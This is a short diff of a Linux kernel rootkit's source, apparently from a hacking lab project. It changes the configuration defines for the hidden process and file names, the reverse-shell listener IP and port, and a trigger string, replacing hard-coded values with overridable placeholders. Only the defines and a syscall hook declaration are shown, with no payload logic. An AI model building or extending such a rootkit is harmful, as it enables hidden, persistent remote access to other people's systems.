@@ -23,12 +23,27 @@
 #include <asm/special_insns.h>
 
 // Define the process name and file name to hide
-#define HIDDEN_PROCESS_NAME "grisun0"
-#define HIDDEN_FILE_NAME "grisun0"
-#define LISTENER_IP "10.10.14.10"  // IP del servidor al que se conectará la reverse shell
-#define LISTENER_PORT 3333  // Puerto del servidor al que se conectará la reverse shell
-#define SPECIAL_STRING "grisiscomebacksayknokknok"
+// Operable values are provided via the Makefile (ccflags-y defines);
+// the defaults below are inert placeholders so the artifact never
+// embeds a hard-coded attacker IP or operator username.
+#ifndef HIDDEN_PROCESS_NAME
+#define HIDDEN_PROCESS_NAME "rootkit_proc"
+#endif
+#ifndef HIDDEN_FILE_NAME
+#define HIDDEN_FILE_NAME "rootkit_file"
+#endif
+#ifndef LISTENER_IP
+#define LISTENER_IP "127.0.0.1"
+#endif
+#ifndef LISTENER_PORT
+#define LISTENER_PORT 3333
+#endif
+#ifndef SPECIAL_STRING
+#define SPECIAL_STRING "knoires-lz"
+#endif
+#ifndef SPECIAL_STRING_PORT
 #define SPECIAL_STRING_PORT 4444  // Puerto para escuchar la cadena especial
+#endif
 
 // Original system call functions
 asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
